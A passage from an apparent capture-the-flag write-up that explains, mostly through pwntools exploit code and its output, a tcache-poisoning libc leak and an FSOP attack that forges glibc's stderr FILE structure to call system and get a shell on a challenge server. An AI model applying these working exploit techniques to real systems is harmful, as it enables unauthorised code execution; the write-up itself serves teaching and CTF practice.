</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="c1"># third fake chunk</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Now, our fake_chunk next chunks will be a valid chunk. We will be able to call free(chunks[4])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Free it to unsorted bin. Remember that chunks[4] == chunks[5]. </span>
</span></span><span class="line"><span class="cl"><span class="c1"># So, if you call list(), chunks[5] content will be a libc address to main_arena+96.</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Get Libc leak</span>
</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="nb">list</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">leaked_libc</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">out</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[5] &#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">][:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;leaked libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_libc</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leaked_libc</span> <span class="o">-</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main_arena&#39;</span><span class="p">]</span><span class="o">+</span><span class="mi">96</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;libc base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Running the above script will give us a libc leak</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[*] leaked libc: 0x7fa505d32ce0
</span></span><span class="line"><span class="cl">[*] libc base: 0x7fa505b19000
</span></span><span class="line"><span class="cl">[*] Paused (press any to continue)
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now we have a libc leak, so obviously, our next step will be to gain code execution</p>
<h4 id="gain-code-execution">Gain Code Execution</h4>
<p>Now that <code>libc-2.35</code> has remove our favorite <code>__free_hook</code>, it isn&rsquo;t easy enough to gain code execution after getting a libc leak. I&rsquo;ve read this two great writeups (<a href="https://github.com/nobodyisnobody/write-ups/tree/main/RCTF.2022/pwn/bfc" target="_blank" rel="noopener noreffer ">Writeup by nobodyisnobody on how to gain code execution in libc-2.35 via strlen+memcpy+one_gadget</a> and <a href="https://sechack.tistory.com/85" target="_blank" rel="noopener noreffer ">Writeup by sechack on how to gain code execution in libc-2.35 via strlen</a>), but none of them seems working on my case. So, I decided to do FSOP Attack to gain code execution. I&rsquo;ve explained a detailed FSOP Attack on <code>libc-2.35</code> in <a href="https://chovid99.github.io/posts/stack-the-flags-ctf-2022/" target="_blank" rel="noopener noreffer ">my previous writeup</a>. You can check that post for further explanation on why my FSOP payload is like this as I use the same idea to gain code execution in this problem.</p>
<p>tl;dr; In order to do FSOP Attack, what we need to do is:</p>
<ul>
<li>Create a fake wide vtable inside our heap area</li>
<li>Create a fake wide data which vtable is pointing tou our fake wide vtable</li>
<li>Poison the <code>tcache</code> free list again, so that we have <strong>two</strong> chunks allocated in <code>_IO_2_1_stderr_</code> area, specifically:
<ul>
<li><code>_IO_2_1_stderr_+0x0</code>, and <code>_IO_2_1_stderr_+0x70</code></li>
<li>The reason why we need two is because to modify the whole <code>stderr</code> FILE, we need to modify around <code>0xe0</code> bytes, while the maximum allocation is <code>0x78</code>. So, I need two chunks to do that.</li>
</ul>
</li>
<li>Modify the <code>stderr</code> FILE so that:
<ul>
<li><code>flags</code> is <code>b'  sh\x00\x00\x00\x00')</code></li>
<li><code>_IO_write_base</code> is 0</li>
<li><code>_IO_write_ptr</code> is 1</li>
<li><code>_wide_data</code> points to our fake wide data</li>
<li><code>vtable</code> points to <code>_IO_wfile_jumps</code> table</li>
</ul>
</li>
<li>Exit from the binary so that we will get a shell.</li>
</ul>
<p>Below is the continue of our previous script with self-explanatory comment:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Now, our target is to hijack the _IO_2_1_stderr_, so that during exit and flushing the available FILE,</span>
</span></span><span class="line"><span class="cl"><span class="c1"># we will get a shell.</span>
</span></span><span class="line"><span class="cl"><span class="n">stderr_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stderr_&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># We only need to forge the wide_vtable+0x68 entry,</span>
</span></span><span class="line"><span class="cl"><span class="c1"># and we will place the fake_wide_vtable on chunks[0]</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_wide_vtable_addr</span> <span class="o">=</span> <span class="n">leaked_heap</span><span class="o">-</span><span class="mh">0x68</span> <span class="c1"># By setting this, fake_wide_vtable+0x68 entry will point to chunks[0]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># We will setup this fake wide vtable contents later after we setup the _IO_2_1_stderr_</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># We only need to forge the wide_data.vtable (which offset is wide_data+0xe0),</span>
</span></span><span class="line"><span class="cl"><span class="c1"># and we will place the fake_wide_data on chunks[1].</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Observing in gdb, chunks[1] = chunks[0] + 0x400</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_wide_data_addr</span> <span class="o">=</span> <span class="n">leaked_heap</span><span class="o">+</span><span class="mh">0x400</span><span class="o">-</span><span class="mh">0xe0</span> <span class="c1"># By setting this, fake_wide_data.vtable will point to chunks[1]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># We will setup this fake wide data contents later after we setup the _IO_2_1_stderr_</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Setup a fake stderr FILE structure</span>
</span></span><span class="line"><span class="cl"><span class="c1"># We will split the whole fake stderr to two chunks</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr</span>                <span class="o">=</span> <span class="n">FileStructure</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr</span><span class="o">.</span><span class="n">flags</span>          <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;  sh</span><span class="se">\x00\x00\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr</span><span class="o">.</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr</span><span class="o">.</span><span class="n">_IO_write_ptr</span>  <span class="o">=</span> <span class="mi">1</span> <span class="c1"># _IO_write_ptr &gt; _IO_write_base</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr</span><span class="o">.</span><span class="n">_wide_data</span>     <span class="o">=</span> <span class="n">fake_wide_data_addr</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr</span><span class="o">.</span><span class="n">vtable</span>         <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;_IO_wfile_jumps&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr_bytes</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">fake_stderr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># We want to allocate a chunk to _IO_2_1_stderr_+0x0</span>
</span></span><span class="line"><span class="cl"><span class="c1"># First, fix the chunks[1] size metadata from 0x420 back to 0x80</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x81</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span> <span class="c1"># After this edit, we will be able to free the chunks[1]</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1"># After this, tcache[0x80] = chunks[4] -&gt; chunks[1]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Remember that chunks[4] = chunks[0]+0x10. So, we&#39;re able to edit chunks[4] tcache pointer via chunks[0].</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Why don&#39;t we directly edit it via chunks[4]? Well we actually can, but in this case, the realloc will throw</span>
</span></span><span class="line"><span class="cl"><span class="c1"># error next size, because the chunks[4] size is no 0x80, and we haven&#39;t properly setup fake chunks in area chunks[4]+0x80</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x81</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mangle</span><span class="p">(</span><span class="n">target_addr</span><span class="p">,</span> <span class="n">stderr_addr</span><span class="p">))</span> <span class="c1"># Don&#39;t forget to mangle it, because tcache pointer expecting a mangled address.</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">)</span> <span class="c1"># After this, next allocation will be placed in _IO_2_1_stderr_+0x0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Put the first half of our fake_stderr bytes on this allocation, because chunks[7] will be</span>
</span></span><span class="line"><span class="cl"><span class="c1"># allocated in _IO_2_1_stderr_+0x0</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fake_stderr_bytes</span><span class="p">[:</span><span class="mh">0x6f</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Now, repeat the previous step so that we can allocate a chunk to _IO_2_1_stderr_+0x70</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1"># Now tcache[0x80] = chunks[0] -&gt; chunks[4]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Poison tcache pointer to point to _IO_2_1_stderr_+0x70</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">mangle</span><span class="p">(</span><span class="n">target_addr</span><span class="p">,</span> <span class="n">stderr_addr</span><span class="o">+</span><span class="mh">0x70</span><span class="p">)))</span> <span class="c1"># Don&#39;t forget to mangle it</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">)</span> <span class="c1"># After this, next allocation will be placed in _IO_2_1_stderr_+0x70</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Put the second half of our fake_stderr bytes on this allocation, because chunks[9] will be</span>
</span></span><span class="line"><span class="cl"><span class="c1"># allocated in _IO_2_1_stderr_+0x70</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fake_stderr_bytes</span><span class="p">[</span><span class="mh">0x70</span><span class="p">:</span><span class="mh">0x70</span><span class="o">+</span><span class="mh">0x6f</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Now that we have successfully forge _IO_2_1_stderr_, time to finish it</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Setup fake_wide_vtable entry to system</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Setup fake_wide_data.vtable to point to our fake wide vtable</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_wide_vtable_addr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Exit from the binary, and we will get a shell!</span>
</span></span><span class="line"><span class="cl"><span class="n">exit_program</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Running the above script, we will get a shell and we will be able to retrieve the flag!</p>
<img src="https://i.imgur.com/hQC7SrX.png"/>
<h3 id="full-script">Full Script</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./chall_patched&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ld</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./ld-2.35.so&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;latin&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;INFO&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">warnings</span><span class="o">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">remote_url</span> <span class="o">=</span> <span class="s2">&#34;re-2.chal.ctf.acsc.asia&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">remote_port</span> <span class="o">=</span> <span class="mi">7352</span>
</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">PLT_DEBUG</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># gdb.attach(r, gdbscript=gdbscript)</span>
</span></span><span class="line"><span class="cl">            <span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">remote_url</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">r</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">demangle</span><span class="p">(</span><span class="n">val</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">mask</span> <span class="o">=</span> <span class="mh">0xfff</span> <span class="o">&lt;&lt;</span> <span class="mi">52</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">mask</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">v</span> <span class="o">=</span> <span class="n">val</span> <span class="o">&amp;</span> <span class="n">mask</span>
</span></span><span class="line"><span class="cl">        <span class="n">val</span> <span class="o">^=</span> <span class="p">(</span><span class="n">v</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">mask</span> <span class="o">&gt;&gt;=</span> <span class="mi">12</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mangle</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">heap_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">memo</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
